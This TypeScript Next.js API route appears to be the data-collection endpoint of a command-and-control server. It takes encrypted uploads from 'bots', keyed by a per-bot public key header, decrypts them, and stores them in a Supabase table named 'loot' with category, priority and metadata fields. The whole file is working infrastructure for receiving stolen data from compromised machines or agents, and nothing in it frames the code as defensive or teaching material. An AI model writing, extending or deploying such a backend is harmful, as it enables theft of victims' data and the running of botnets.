import { createClient } from "@supabase/supabase-js";
import { NextRequest, NextResponse } from "next/server";
import { deriveSessionKey, decryptPayload, encryptPayload } from "@/lib/crypto";

function getSupabase() {
    return createClient(
        process.env.NEXT_PUBLIC_SUPABASE_URL!,
        process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
    );
}

export async function POST(request: NextRequest) {
    try {
        const botPubKeyB64 = request.headers.get("X-Bot-PubKey");
        if (!botPubKeyB64) {
            return NextResponse.json({ error: "missing pubkey" }, { status: 400 });
        }

        const sessionKey = await deriveSessionKey(botPubKeyB64);

        const encData = await request.json();
        if (!encData || !encData.iv || !encData.ciphertext) {
            return NextResponse.json({ error: "invalid payload" }, { status: 400 });
        }

        const body = await decryptPayload(sessionKey, encData.iv, encData.ciphertext);
        const { bot_id, category, title, content, priority, metadata } = body;

        if (!bot_id || !title) {
            return NextResponse.json({ error: "bot_id and title required" }, { status: 400 });
        }

        const supabase = getSupabase();

        const { error } = await supabase.from("loot").insert({
            bot_id,
            category: category || "other",
            title,
            content: content || "",
            priority: priority ?? 1,
            metadata: metadata || {},
        });

        if (error) {
            console.error("Loot insert error:", error);
            return NextResponse.json({ error: "insert failed" }, { status: 500 });
        }

        const encResponse = await encryptPayload(sessionKey, { status: "ok" });
        return NextResponse.json(encResponse);
    } catch (e) {
        console.error("Loot error:", e);
        return NextResponse.json({ error: "internal error" }, { status: 500 });
    }
}
